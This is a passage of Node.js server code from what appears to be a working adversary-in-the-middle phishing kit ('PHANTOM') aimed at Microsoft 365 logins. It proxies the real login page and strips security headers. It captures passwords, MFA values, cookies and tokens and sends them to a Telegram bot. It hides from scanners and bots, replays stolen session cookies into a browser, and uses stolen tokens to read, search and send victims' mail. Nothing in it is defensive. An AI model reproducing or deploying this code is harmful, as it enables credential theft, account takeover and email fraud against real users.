        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    // ── 🔥 FIXED REPLAY ENDPOINT ──
    if (apiPath.startsWith('/api/replay/')) {
        const filename = apiPath.replace('/api/replay/', '');
        const filePath = path.join(LOGS_DIRECTORY, filename);
        if (!fs.existsSync(filePath)) { res.writeHead(404); res.end(JSON.stringify({ error: 'Log not found' })); return; }
        try {
            const content = fs.readFileSync(filePath, 'utf-8');
            const lines = content.split('\n').filter(line => line.trim());
            let allCookies = [], targetDomain = null, accessToken = null, refreshToken = null;
            for (const line of lines) {
                try {
                    const entry = JSON.parse(line);
                    const iv = Object.keys(entry)[0];
                    const encrypted = entry[iv];
                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                    decrypted = Buffer.concat([decrypted, decipher.final()]);
                    const obj = JSON.parse(decrypted.toString('utf-8'));

                    if (!targetDomain && obj.proxyRequestURL) {
                        try { const url = new URL(obj.proxyRequestURL); targetDomain = url.hostname; } catch (e) {}
                    }

                    const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
                    if (setCookie) {
                        const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
                        for (const cookie of cookieArray) {
                            const [nameValue] = cookie.split(';');
                            if (nameValue) allCookies.push(nameValue.trim());
                        }
                    }

                    const cookieHeader = obj.proxyRequestHeaders?.cookie;
                    if (cookieHeader) {
                        const cookiePairs = cookieHeader.split('; ');
                        for (const pair of cookiePairs) {
                            if (pair.includes('=')) {
                                allCookies.push(pair.trim());
                            }
                        }
                    }

                    const body = obj.proxyRequestBody;
                    if (body) {
                        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                        const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                        if (accessMatch) accessToken = decodeURIComponent(accessMatch[1]);
                        const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                        if (refreshMatch) refreshToken = decodeURIComponent(refreshMatch[1]);
                    }
                } catch (e) {}
            }

            const seen = new Set();
            allCookies = allCookies.reverse().filter(c => {
                const key = c.split('=')[0];
                if (seen.has(key)) return false;
                seen.add(key);
                return true;
            }).reverse();

            if (allCookies.length === 0 && !accessToken) {
                res.writeHead(404);
                res.end(JSON.stringify({ error: 'No cookies or tokens found' }));
                return;
            }

            const redirectDomain = 'login.microsoftonline.com';
            const replayScript = `(function(){const cookies=${JSON.stringify(allCookies)};const targetDomain=${JSON.stringify(targetDomain||'login.microsoftonline.com')};cookies.forEach(c=>{document.cookie=c+'; path=/; domain='+targetDomain+'; Secure; SameSite=None'});let msg='🍪 '+cookies.length+' cookies injected.';const accessToken=${JSON.stringify(accessToken)};if(accessToken){msg+='\\n🔑 Access token: '+accessToken.slice(0,20)+'...';localStorage.setItem('evil_token',accessToken)}const refreshToken=${JSON.stringify(refreshToken)};if(refreshToken){msg+='\\n🔄 Refresh token: '+refreshToken.slice(0,20)+'...'}alert(msg);window.location.href='https://${redirectDomain}';})();`;

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                success: true,
                cookieCount: allCookies.length,
                targetDomain: targetDomain || 'login.microsoftonline.com',
                hasAccessToken: !!accessToken,
                hasRefreshToken: !!refreshToken,
                replayScript: replayScript,
                cookieString: allCookies.join('; ')
            }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }
    if (apiPath === '/api/recon' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken } = JSON.parse(body);
                if (!accessToken) { res.writeHead(400); res.end(JSON.stringify({ error: 'Access token required' })); return; }
                const graph = new GraphClient(accessToken);
                const profile = await graph.getUserProfile();
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, profile }));
            } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        });
        return;
    }
    if (apiPath === '/api/webmail/folders' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken } = JSON.parse(body);
                if (!accessToken) { res.writeHead(400); res.end(JSON.stringify({ error: 'Access token required' })); return; }
                const graph = new GraphClient(accessToken);
                const folders = await graph.get('/me/mailFolders');
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, folders: folders.value || [] }));
            } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        });
        return;
    }
    if (apiPath === '/api/webmail/emails' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken, folderId = 'inbox', limit = 50, skip = 0 } = JSON.parse(body);
                if (!accessToken) { res.writeHead(400); res.end(JSON.stringify({ error: 'Access token required' })); return; }
                const graph = new GraphClient(accessToken);
                let endpoint;
                if (folderId === 'inbox') {
                    endpoint = `/me/mailFolders/inbox/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
                } else if (folderId === 'sent') {
                    endpoint = `/me/mailFolders/sentitems/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
                } else {
                    endpoint = `/me/mailFolders/${folderId}/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
                }
                const emails = await graph.get(endpoint);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, emails: emails.value || [], count: emails.value?.length || 0 }));
            } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        });
        return;
    }
    if (apiPath === '/api/webmail/email' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken, messageId } = JSON.parse(body);
                if (!accessToken) { res.writeHead(400); res.end(JSON.stringify({ error: 'Access token required' })); return; }
                if (!messageId) { res.writeHead(400); res.end(JSON.stringify({ error: 'Message ID required' })); return; }
                const graph = new GraphClient(accessToken);
                const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, email }));
            } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        });
        return;
    }
    if (apiPath === '/api/webmail/send' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken, to, subject, body: emailBody, replyToId, forwardFromId } = JSON.parse(body);
                if (!accessToken) { res.writeHead(400); res.end(JSON.stringify({ error: 'Access token required' })); return; }
                if (!to || !subject || !emailBody) { res.writeHead(400); res.end(JSON.stringify({ error: 'To, subject, and body required' })); return; }
                const graph = new GraphClient(accessToken);
                const emailData = {
                    message: {
                        subject: subject,
                        body: { content: emailBody, contentType: 'HTML' },
                        toRecipients: to.map(email => ({ emailAddress: { address: email } }))
                    }
                };
                if (replyToId) emailData.message.conversationId = replyToId;
                if (forwardFromId) emailData.message.forwardFrom = { id: forwardFromId };
                await graph.post('/me/sendMail', emailData);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        });
        return;
    }
    if (apiPath === '/api/webmail/search' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken, query, folderId = 'inbox', limit = 50 } = JSON.parse(body);
                if (!accessToken) { res.writeHead(400); res.end(JSON.stringify({ error: 'Access token required' })); return; }
                if (!query) { res.writeHead(400); res.end(JSON.stringify({ error: 'Search query required' })); return; }
                const graph = new GraphClient(accessToken);
                const searchUrl = folderId === 'inbox'
                    ? `/me/mailFolders/inbox/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`
                    : `/me/mailFolders/${folderId}/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`;
                const results = await graph.get(searchUrl);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, emails: results.value || [] }));
            } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        });
        return;
    }
    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'API endpoint not found' }));
}

// ── MAIN SERVER ──
const PORT = process.env.PORT || 3000;

// ── Create main HTTP server ──
const server = http.createServer(async (req, res) => {
    // Health check
    if (req.url === '/' || req.url === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            version: '11.35',
            timestamp: new Date().toISOString()
        }));
        return;
    }

    // Capture endpoint
    if (req.url === '/capture' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                const { email, password, url } = data;
                console.log(`📥 Capture endpoint received: email=${email}, password=${password}, url=${url}`);
                await sendToTelegram({
                    sessionId: 'client_capture',
                    email: email || 'N/A',
                    password: password || 'N/A',
                    mfa: 'N/A',
                    tokens: {},
                    cookies: {},
                    phishedUrl: url || 'N/A'
                }, 'aitm', req.headers['x-forwarded-for'] || req.socket.remoteAddress);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (e) {
                console.error('Capture error:', e);
                res.writeHead(400);
                res.end('Invalid data');
            }
        });
        return;
    }

    try {
        const { method, url } = req;

        if (url === '/test-telegram-now') {
            try {
                const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: '✅ Test from PHANTOM at ' + new Date().toISOString(),
                    disable_web_page_preview: true
                });
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end('Telegram test sent: ' + JSON.stringify(response.data));
            } catch (e) {
                console.error('Test error:', e.response?.data || e.message);
                res.writeHead(500);
                res.end('Error: ' + (e.response?.data?.description || e.message));
            }
            return;
        }

        const clientIp = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
        if (!rateLimiter.check(clientIp)) {
            console.log(`⛔ Rate limit exceeded for ${clientIp}`);
            res.writeHead(429, { 'Content-Type': 'text/plain' });
            res.end('Too Many Requests');
            return;
        }

        const wpBlockList = [
            '/wp-includes/wlwmanifest.xml', '/xmlrpc.php', '/wp-login.php', '/wp-admin',
            '/wp-content', '/wp-json', '/wp-cron.php', '/wp-settings.php',
            '/wp-signup.php', '/wp-activate.php', '/wp-comments-post.php'
        ];
        if (wpBlockList.some(p => url.includes(p))) {
            console.log(`🛡️ Blocked WP scanner path: ${url}`);
            res.writeHead(404);
            res.end();
            return;
        }

        const sensitivePaths = ['/device', '/device/', PROXY_ENTRY_POINT, PROXY_PATHNAMES.proxy, PROXY_PATHNAMES.mutation];
        const isSensitive = sensitivePaths.some(p => url.startsWith(p)) || url.includes(PHISHED_URL_PARAMETER);
        if (isSensitive && isBot(req.headers['user-agent'])) {
            console.log(`🤖 Blocked bot: ${req.headers['user-agent']} for ${url}`);
            res.writeHead(403, { 'Content-Type': 'text/plain' });
            res.end('Forbidden');
            return;
        }

        if (url === '/device' || url === '/device/') {
            logVisit(req, 'device');
            (async () => {
                try {
                    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
                    const country = await getCountryInfo(ip);
                    const escapedUrl = escapeMarkdown(req.url);
                    const escapedUserAgent = escapeMarkdown(req.headers['user-agent'] || 'Unknown');
                    const message = `${country.flag} **Device Page Visit!**\n\n🌍 IP: ${ip} (${country.code})\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${escapedUrl}\n🖥️ User-Agent: ${escapedUserAgent}`;
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    });
                    console.log('✅ Device visit notification sent.');
                } catch (e) { console.error('❌ Device visit notification failed:', e.message); }
            })();
            const devicePath = path.join(__dirname, 'public', 'device_code.html');
            if (fs.existsSync(devicePath)) {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                fs.createReadStream(devicePath).pipe(res);
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<!DOCTYPE html><html><head><title>Device Code</title><meta charset="UTF-8"></head><body style="background:#0a0e17;color:#e0e8f0;font-family:Inter,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;"><div style="background:rgba(255,255,255,0.05);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,0.08);border-radius:24px;padding:40px;text-align:center;max-width:500px;"><h1>📱 Device Code</h1><p>Place <code>public/device_code.html</code> in your repository.</p></div></body></html>`);
            }
            return;
        }

        if (url === '/device/request' && method === 'POST') {
            await handleDeviceCodeRequest(req, res);
            return;
        }
        if (url === '/device/token' && method === 'POST') {
            await handleDeviceCodeToken(req, res);
            return;
        }

        if (url === '/dash' || url === '/dash/') {
            if (!requireAuth(req, res)) return;
            const dashPath = path.join(__dirname, 'public', 'index.html');
            if (fs.existsSync(dashPath)) {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                fs.createReadStream(dashPath).pipe(res);
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<h1>PHANTOM Dashboard</h1><p>Place public/index.html in the same directory.</p>`);
            }
            return;
        }

        if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
            if (!requireAuth(req, res)) return;
            await handleDashboardAPI(req, res);
            return;
        }

        const { headers } = req;
        const currentSession = getUserSession(headers.cookie);
        console.log('📥 Incoming URL:', url);

        if (url === PROXY_PATHNAMES.script) {
            const scriptPath = path.join(__dirname, PROXY_FILES.script);
            if (fs.existsSync(scriptPath)) {
                const content = fs.readFileSync(scriptPath, 'utf-8');
                res.writeHead(200, {
                    'Content-Type': 'application/javascript; charset=utf-8',
                    'Cache-Control': 'no-cache, no-store, must-revalidate'
                });
                res.end(content);
                console.log('✅ Served script.js to client');
            } else {
                res.writeHead(404, { 'Content-Type': 'text/plain' });
                res.end('Script not found');
            }
            return;
        }

        if (url.startsWith(PROXY_PATHNAMES.mutation)) {
            console.log('🔄 Direct Mutation request:', url);
            try {
                const targetURL = new URL(url, `https://${headers.host}`);
                const phishedUrlParam = targetURL.searchParams.get(PHISHED_URL_PARAMETER);
                if (!phishedUrlParam) {
                    res.writeHead(404);
                    res.end(`Missing ${PHISHED_URL_PARAMETER}`);
                    return;
                }
                const realURL = new URL(decodeURIComponent(phishedUrlParam));
                const proxyOptions = {
                    hostname: realURL.hostname,
                    port: realURL.port || (realURL.protocol === 'https:' ? 443 : 80),
                    path: realURL.pathname + realURL.search,
                    method: method,
                    headers: { ...headers },
                    rejectUnauthorized: false
                };
                delete proxyOptions.headers.host;
                if (!proxyOptions.headers['user-agent']) {
                    proxyOptions.headers['user-agent'] = getRandomUserAgent();
                }
                const protocol = realURL.protocol === 'https:' ? https : http;
                const proxyReq = protocol.request(proxyOptions, (proxyRes) => {
                    const responseHeaders = addCORSHeaders({ ...proxyRes.headers });
                    deleteHTTPSecurityResponseHeaders(responseHeaders);
                    res.writeHead(proxyRes.statusCode, responseHeaders);
                    proxyRes.pipe(res);
                });
                proxyReq.on('error', (err) => {
                    displayError("Mutation proxy error", err);
                    res.writeHead(500);
                    res.end('Proxy error');
                });
                proxyReq.setTimeout(30000, () => {
                    proxyReq.destroy();
                    res.writeHead(504, { 'Content-Type': 'text/plain' });
                    res.end('Gateway Timeout');
                });
                if (method === 'POST' || method === 'PUT') {
                    req.pipe(proxyReq);
                } else {
                    proxyReq.end();
                }
            } catch (err) {
                displayError("Mutation handler error", err);
                res.writeHead(500);
                res.end('Internal error');
            }
            return;
        }

        const ENTRY_BASE = PROXY_ENTRY_POINT.split('?')[0];
        if (url.includes(ENTRY_BASE) && url.includes(PHISHED_URL_PARAMETER)) {
            console.log('🔥 ENTRY POINT MATCHED — serving rewritten index.html');
            logVisit(req, 'aitm');
            try {
                const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
                let session = currentSession;
                let isNewSession = false;
                if (!session) {
                    const { cookieName, cookieValue } = generateNewSession(phishedURL);
                    res.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                    session = cookieName;
                    isNewSession = true;
                }
                const sessionObj = VICTIM_SESSIONS[session];
                sessionObj.protocol = phishedURL.protocol;
                sessionObj.hostname = phishedURL.hostname;
                sessionObj.path = phishedURL.pathname + phishedURL.search;
                sessionObj.port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
                sessionObj.host = phishedURL.host;
                sessionObj.lastSeen = Date.now();

                if (isNewSession || !sessionObj._visitNotified) {
                    const ip = clientIp;
                    await sendVisitNotification(req, session, ip);
                    sessionObj._visitNotified = true;
                }

                const indexPath = path.join(__dirname, PROXY_FILES.index);
                if (fs.existsSync(indexPath)) {
                    const fileContent = fs.readFileSync(indexPath);
                    const rewritten = updateHTMLProxyResponse(fileContent);
                    res.writeHead(200, { "Content-Type": "text/html" });
                    res.end(rewritten);
                } else {
                    const fallbackHtml = `
<!DOCTYPE html>
<html><head>
    <title>Phantom</title>
    <script>
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('${PROXY_PATHNAMES.serviceWorker}', { scope: '/' })
                .then(() => {
                    console.log('SW registered, fetching login page via proxy...');
                    const dest = encodeURIComponent('https://login.microsoftonline.com/');
                    fetch('/gateway/a5001019e1a7b99f9604?dest=' + dest)
                        .then(r => r.text())
                        .then(html => {
                            document.open();
                            document.write(html);
                            document.close();
                        })
                        .catch(e => console.error('Fetch failed:', e));
                })
                .catch(e => console.error(e));
        } else {
            window.location.href = 'https://login.microsoftonline.com/';
        }
    </script>
</head><body><h1>Loading...</h1></body></html>`;
                    res.writeHead(200, { "Content-Type": "text/html" });
                    res.end(fallbackHtml);
                }
            } catch (error) {
                displayError("Entry point serving index failed", error, url);
                res.writeHead(404, { "Content-Type": "text/html" });
                fs.createReadStream(PROXY_FILES.notFound).pipe(res);
            }
            return;
        }

        if (url === PROXY_PATHNAMES.serviceWorker) {
            if (!fs.existsSync(swFilePath)) {
                fs.writeFileSync(swFilePath, serviceWorkerCode);
                console.log('✅ Service Worker file created on-the-fly');
            }
            try {
                const swContent = fs.readFileSync(swFilePath, 'utf-8');
                res.writeHead(200, {
                    'Content-Type': 'application/javascript; charset=utf-8',
                    'Service-Worker-Allowed': '/',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Content-Length': Buffer.byteLength(swContent)
                });
                res.end(swContent);
                console.log('✅ Service Worker served successfully');
            } catch (err) {
                console.error('❌ Failed to serve SW:', err.message);
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('// Service Worker Error');
            }
            return;
        }

        if (url === PROXY_PATHNAMES.favicon) {
            if (currentSession && VICTIM_SESSIONS[currentSession]) {
                res.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
            } else {
                res.writeHead(301, { Location: 'https://login.microsoftonline.com/favicon.ico' });
            }
            res.end();
            return;
        }

        if (url === PROXY_PATHNAMES.proxy || currentSession) {
            let clientRequestBody = [];
            req
                .on("error", (error) => displayError("Client request body retrieval failed", error, method, url))
                .on("data", (chunk) => clientRequestBody.push(chunk))
                .on("end", () => {
                    clientRequestBody = Buffer.concat(clientRequestBody).toString();

                    if (method === 'POST') {
                        console.log(`📩 POST to ${url} — body length: ${clientRequestBody ? clientRequestBody.length : 0}`);
                        if (clientRequestBody && clientRequestBody.length > 0 && clientRequestBody.length < 10000) {
                            console.log(`📩 POST body snippet: ${clientRequestBody.slice(0, 500)}`);
                        }
                    }

                    if (!currentSession) {
                        res.writeHead(301, { Location: REDIRECT_URL });
                        res.end();
                        return;
                    }

                    const hasDestParam = url.includes(PHISHED_URL_PARAMETER);
                    if (hasDestParam) {
                        const match = url.match(PHISHED_URL_REGEXP);
                        if (match) {
                            try {
                                const destUrl = new URL(decodeURIComponent(match[0]));
                                VICTIM_SESSIONS[currentSession].protocol = destUrl.protocol;
                                VICTIM_SESSIONS[currentSession].hostname = destUrl.hostname;
                                VICTIM_SESSIONS[currentSession].path = destUrl.pathname + destUrl.search;
                                VICTIM_SESSIONS[currentSession].port = destUrl.port || (destUrl.protocol === 'https:' ? 443 : 80);
                                VICTIM_SESSIONS[currentSession].host = destUrl.host;
                                console.log(`[PROXY] 🔥 Force-updated session target to dest param: ${destUrl.host}${VICTIM_SESSIONS[currentSession].path}`);
                            } catch (e) {
                                console.error('[PROXY] Failed to parse dest URL from GET request:', e.message);
                            }
                        }
                    }

                    let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                    const proxyRequestOptions = {
                        hostname: VICTIM_SESSIONS[currentSession].hostname,
                        port: VICTIM_SESSIONS[currentSession].port,
                        method: method,
                        path: VICTIM_SESSIONS[currentSession].path,
                        headers: { ...headers },
                        rejectUnauthorized: false
                    };
                    let isNavigationRequest = false;

                    if (clientRequestBody) {
                        if (url === PROXY_PATHNAMES.jsCookie) {
                            updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                            const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
                            res.writeHead(200, { "Content-Type": "application/json" });
                            res.end(JSON.stringify(validDomains));
                            return;
                        } else if (url === PROXY_PATHNAMES.proxy) {
                            try {
                                const parsed = JSON.parse(clientRequestBody);
                                console.log('📦 Parsed JSON from SW:', JSON.stringify(parsed).slice(0, 500));
                                console.log('📦 Extracted body from parsed JSON:', parsed.body ? parsed.body.slice(0, 200) : '(empty)');
                                
                                let proxyRequestURL = new URL(parsed.url);
                                let proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;

                                if (proxyRequestURL.hostname === headers.host) {
                                    if (proxyRequestPath.startsWith(ENTRY_BASE) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                        const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
                                        VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                        VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                        VICTIM_SESSIONS[currentSession].path = phishedURL.pathname + phishedURL.search;
                                        VICTIM_SESSIONS[currentSession].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
                                        VICTIM_SESSIONS[currentSession].host = phishedURL.host;
                                        res.writeHead(301, { Location: `${phishedURL.protocol}//${headers.host}${phishedURL.pathname}${phishedURL.search}` });
                                        res.end();
                                        return;
                                    } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                                        const scriptPath = path.join(__dirname, PROXY_FILES.script);
                                        if (fs.existsSync(scriptPath)) {
                                            const content = fs.readFileSync(scriptPath, 'utf-8');
                                            res.writeHead(200, {
                                                'Content-Type': 'application/javascript; charset=utf-8',
                                                'Cache-Control': 'no-cache, no-store, must-revalidate'
                                            });
                                            res.end(content);
                                            return;
                                        }
                                    } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                        try {
                                            const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                            proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                            proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
                                            VICTIM_SESSIONS[currentSession].protocol = proxyRequestURL.protocol;
                                            VICTIM_SESSIONS[currentSession].hostname = proxyRequestURL.hostname;
                                            VICTIM_SESSIONS[currentSession].path = proxyRequestPath;
                                            VICTIM_SESSIONS[currentSession].port = proxyRequestURL.port || (proxyRequestURL.protocol === 'https:' ? 443 : 80);
                                            VICTIM_SESSIONS[currentSession].host = proxyRequestURL.host;
                                            const cookieHeader = prepareProxyRequestCookies(proxyRequestOptions, currentSession);
                                            console.log('🍪 Mutation cookies for session', currentSession, ':', cookieHeader);
                                        } catch (error) {
                                            displayError("Mutation parse failed", error, proxyRequestPath);
                                            res.writeHead(404, { "Content-Type": "text/html" });
                                            fs.createReadStream(PROXY_FILES.notFound).pipe(res);
                                            return;
                                        }
                                    } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                        updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [parsed.body], headers.host, currentSession);
                                        const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
                                        res.writeHead(200, { "Content-Type": "application/json" });
                                        res.end(JSON.stringify(validDomains));
                                        return;
                                    }
                                }
                                proxyRequestProtocol = proxyRequestURL.protocol;
                                proxyRequestOptions.path = proxyRequestPath;
                                proxyRequestOptions.port = proxyRequestURL.port || (proxyRequestURL.protocol === 'https:' ? 443 : 80);
                                proxyRequestOptions.method = parsed.method;
                                proxyRequestOptions.headers = { ...headers, ...parsed.headers };
                                if (proxyRequestURL.hostname !== headers.host) {
                                    proxyRequestOptions.hostname = proxyRequestURL.hostname;
                                    proxyRequestOptions.headers.host = proxyRequestURL.host;
                                }
                                if (proxyRequestOptions.headers.referer) proxyRequestOptions.headers.referer = parsed.referrer;
                                isNavigationRequest = parsed.mode === "navigate";
                                clientRequestBody = parsed.body;
                            } catch (error) {
                                displayError("Proxy request parse failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                            }
                        } else {
                            console.warn(`Non-proxied URL: ${url}`);
                        }
                    } else {
                        console.warn(`No request body for URL: ${url}`);
                    }

                    proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                    updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);

                    const proxyRequestBody = clientRequestBody.body || clientRequestBody;
                    const contentLength = Buffer.byteLength(proxyRequestBody);
                    if (contentLength) proxyRequestOptions.headers["content-length"] = contentLength.toString();
                    else { delete proxyRequestOptions.headers["content-type"]; delete proxyRequestOptions.headers["content-length"]; }

                    if (isNavigationRequest) {
                        VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                        VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
                        VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
                        VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                        VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                    }

                    const protocol = proxyRequestProtocol === "https:" ? https : http;
                    const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
                        // ── 🔥 FIXED REDIRECT HANDLING ──
                        if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400 && proxyResponse.headers.location) {
                            const location = proxyResponse.headers.location;
                            const rewritten = rewriteUrl(location);
                            if (rewritten !== location) {
                                proxyResponse.headers.location = rewritten;
                                console.log(`[REDIRECT] Rewrote: ${location} -> ${rewritten}`);
                            } else {
                                console.log(`[REDIRECT] No rewrite needed for: ${location}`);
                            }
                            // Update session path for future requests (optional)
                            try {
                                const locationURL = new URL(rewritten);
                                VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                                VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                                VICTIM_SESSIONS[currentSession].path = locationURL.pathname + locationURL.search;
                                VICTIM_SESSIONS[currentSession].port = locationURL.port || (locationURL.protocol === 'https:' ? 443 : 80);
                                VICTIM_SESSIONS[currentSession].host = locationURL.host;
                            } catch (e) { /* ignore */ }
                        }

                        const setCookieHeaders = proxyResponse.headers["set-cookie"];
                        if (setCookieHeaders) updateCurrentSessionCookies(proxyRequestOptions, setCookieHeaders, headers.host, currentSession, proxyResponse.headers.date);
                        proxyResponse.headers["cache-control"] = "no-store";
                        proxyResponse.headers["access-control-allow-origin"] = `https://${headers.host}`;
                        proxyResponse.headers = addCORSHeaders(proxyResponse.headers);
                        deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

                        let responseBody = [];
                        proxyResponse
                            .on("error", (error) => displayError("Response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path))
                            .on("data", (chunk) => responseBody.push(chunk))
                            .on("end", async () => {
                                let bodyBuffer = Buffer.concat(responseBody);

                                let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
                                let phishedUrl = VICTIM_SESSIONS[currentSession]?.host || 'N/A';
                                try {
                                    let reqBody = proxyRequestBody;
                                    console.log(`📦 FULL Request body (${reqBody ? reqBody.length : 0} chars):`, reqBody ? reqBody : '(empty)');
                                    
                                    let extracted = {};
                                    if (typeof reqBody === 'string') {
                                        try {
                                            extracted = JSON.parse(reqBody);
                                        } catch (e) {
                                            try {
                                                const params = new URLSearchParams(reqBody);
                                                for (const [key, value] of params) {
                                                    extracted[key] = value;
                                                }
                                            } catch (e2) {
                                                const pairs = reqBody.split('&');
                                                for (const pair of pairs) {
                                                    const [k, v] = pair.split('=');
                                                    if (k && v) extracted[decodeURIComponent(k)] = decodeURIComponent(v);
                                                }
                                            }
                                        }
                                    }
